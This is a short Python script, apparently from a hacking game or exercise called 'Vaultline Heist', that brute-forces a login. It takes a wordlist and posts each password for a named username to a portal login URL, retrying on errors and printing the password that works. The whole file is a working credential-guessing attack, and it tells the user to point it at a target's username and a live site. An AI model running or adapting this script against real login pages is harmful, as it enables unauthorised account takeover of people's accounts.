"""
Vaultline Heist — password brute-forcer (Stage 1).

Tries each password from the wordlist against the login until one works.
Edit USERNAME (and URL for the live site), then run:  python brute_force.py
"""

import time
import requests

USERNAME = "t.caldwell"                              # your target's username
URL      = "https://hackme.smecworkspace.com/portal/login/"    # the login endpoint
WORDLIST = "tools/wordlist.txt"                      # the password list

print(f"[*] Brute-forcing {USERNAME} ...", flush=True)

tries = 0
for line in open(WORDLIST, encoding="latin-1", errors="ignore"):
    password = line.strip()
    tries += 1
    for attempt in range(3):                         # retry transient server hiccups
        try:
            r = requests.post(URL, json={"username": USERNAME, "password": password}, timeout=15)
            success = r.status_code == 200 and r.json().get("success")
            break
        except Exception:
            success = False
            time.sleep(1)                            # brief pause, then retry same password
    if success:
        print(f"[+] FOUND after {tries} tries -> {password}")
        break
    print(f"[{tries}] tried: {password}", flush=True)   # live progress
else:
    print("[-] Not found. Wrong wordlist or username?")
